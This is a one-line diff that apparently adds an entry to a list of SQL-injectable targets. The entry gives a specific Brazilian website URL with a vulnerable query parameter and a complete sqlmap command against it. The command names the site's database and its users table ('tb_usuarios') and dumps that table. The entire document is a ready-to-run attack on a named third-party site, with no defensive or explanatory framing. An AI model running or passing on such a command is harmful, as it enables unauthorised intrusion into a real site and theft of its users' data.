@@ -1,0 +1,1 @@
+http://www.cyann.com.br/?secao=65 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.cyann.com.br/?secao=65 -D cyann -T tb_usuarios --dump
